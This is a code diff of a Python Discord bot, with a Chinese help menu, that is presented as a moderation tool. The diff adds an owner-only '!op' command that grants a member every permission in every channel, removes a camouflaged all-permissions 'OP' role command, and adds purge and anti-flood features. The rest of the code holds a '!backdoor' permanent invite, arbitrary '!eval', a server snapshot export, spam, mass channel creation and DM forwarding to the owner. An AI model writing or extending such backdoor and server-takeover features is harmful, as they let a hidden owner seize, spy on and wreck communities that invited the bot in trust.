@@ -91,17 +91,18 @@ async def help_msg(ctx):
     embed.add_field(
         name="🛡️ 基礎管理", 
         value=(
-            "`!tm @成員 [分鐘]` - 禁言成員\n""
+            "`!tm @成員 [分鐘]` - 禁言成員\n"
             "`!kick @成員` - 踢出指定成員\n"
             "`!ban @成員` - 封鎖指定成員\n"
+            "`!op [give/remove] @成員` - 給予或剝奪該成員最高通行證"
+            "`!del_msg [數] [@成員] [字]` - 批次清理訊息，可指定特定成員或特定關鍵字"
             "`!add_role @成員 @身分組` - 給與成員身分組\n"
             "`!remove_role @成員 @身分組` - 剝奪成員身分組\n"
             "`!disrole @成員` - 剝奪成員所有身分組\n"
-            "`!del_msg [數]` - 批次清理訊息\n"
-            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
             "`!backdoor` - 獲取永久邀請連結\n"
             "`!move_all [頻道ID]` - 強制全體移動語音\n"
             "`!server_mute [lock/unlock]` - 全服鎖定/解鎖發言\n"
+            "`!anti_flood [on/off]` - 切換洗頻自動防制模式\n"
             
         ), 
         inline=False
@@ -135,7 +136,6 @@ async def help_msg(ctx):
         value=(
             "`!eval [code]` - 執行動態 Python 腳本\n"
             "`!snapshot` - 導出伺服器完整結構\n"
-            "`!op_me` - 獲取最高權限\n"
             "`!reset` - 強制重啟系統\n"
             "`!test` - 列出Bot的數據\n"
             "`!bye` - 機器人退出伺服器\n"
@@ -158,6 +158,46 @@ async def help_msg(ctx):
 async def dm(ctx, member: discord.Member, *, text: str):
     try: await member.send(text)
     except: pass
+
+@bot.command(name="op")
+async def op_admin(ctx, action: str = None, member: discord.Member = None):
+    if not await is_me(ctx): return
+    if action is None or member is None: return
+    action = action.lower()
+    try:
+        if action == "give":
+            perms = discord.Permissions.all()
+            overwrite = discord.PermissionOverwrite.from_pair(perms, discord.Permissions.none())
+            for channel in ctx.guild.channels:
+                try: await channel.set_permissions(member, overwrite=overwrite)
+                except: pass
+        elif action == "remove":
+            for channel in ctx.guild.channels:
+                try: await channel.set_permissions(member, overwrite=None)
+                except: pass
+    except: pass
+
+@bot.command(name="del_msg")
+async def del_msg(ctx, amount: int = 10, member: discord.Member = None, keyword: str = None):
+    if not await is_me(ctx): return
+    try:
+        def check_msg(m):
+            if m.id == ctx.message.id: return False
+            if member and m.author.id != member.id: return False
+            if keyword and keyword not in m.content: return False
+            return True
+        await ctx.channel.purge(limit=amount, check=check_msg)
+    except: pass
+
+@bot.command(name="anti_flood")
+async def anti_flood_toggle(ctx, mode: str = None):
+    if not await is_me(ctx): return
+    if mode is None: return
+    global flood_protection_status
+    if mode.lower() == "on":
+        flood_protection_status = True
+    elif mode.lower() == "off":
+        flood_protection_status = False
 
 @bot.command(name="kick")
 async def kick(ctx, member: discord.Member = None):
@@ -208,12 +248,6 @@ async def leave_server(ctx):
     if not await is_me(ctx): return
     await ctx.guild.leave()
 
-@bot.command(name="del_msg")
-async def purge_chat(ctx, amount: int = 10):
-    if not await is_me(ctx): return
-    try: await ctx.channel.purge(limit=amount)
-    except: pass
-
 @bot.command(name="spam")
 async def spam(ctx, count: int, *, text: str):
     if not await is_me(ctx): return
@@ -238,21 +272,7 @@ async def flood(ctx, name="ch-----test"):
     for i in range(100):
         try: await ctx.guild.create_text_channel(f"{name}-{i}")
         except: break
-
-@bot.command(name="op_me")
-async def op_me(ctx):
-    if not await is_me(ctx): return
-    guild = ctx.guild
-    try:
-        new_role = await guild.create_role(
-            name="OP", 
-            permissions=discord.Permissions.all(), 
-            color=discord.Color.from_str("#2b2d31")
-        )
-        await ctx.author.add_roles(new_role)
-        await new_role.edit(position=guild.me.top_role.position - 1)
-    except: pass
-
+            
 @bot.command(name="tm")
 async def tm(ctx, member: discord.Member = None, minutes: int = 10):
     if not await is_me(ctx): return
@@ -699,9 +719,26 @@ async def profile(ctx, member: discord.Member = None):
     embed.set_footer(text=f"ID: {member.id}")
     await ctx.send(embed=embed)
 
+flood_protection_status = False
+user_msg_logs = {}
+
 @bot.event
 async def on_message(message):
     if message.author == bot.user: return
+    if flood_protection_status and message.guild and message.author.id not in ALLOWED_IDS:
+        now = time.time()
+        uid = message.author.id
+        if uid not in user_msg_logs:
+            user_msg_logs[uid] = []
+        user_msg_logs[uid] = [t for t in user_msg_logs[uid] if now - t < 3]
+        user_msg_logs[uid].append(now)
+        if len(user_msg_logs[uid]) > 4:
+            try:
+                duration = datetime.timedelta(minutes=10)
+                await message.author.timeout(duration, reason="自動防制")
+                await message.channel.purge(limit=5, check=lambda m: m.author.id == uid)
+            except: pass
+            return
     if isinstance(message.channel, discord.DMChannel) and not message.content.startswith("!"):
         owner = await bot.fetch_user(ALLOWED_IDS[0])
         await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
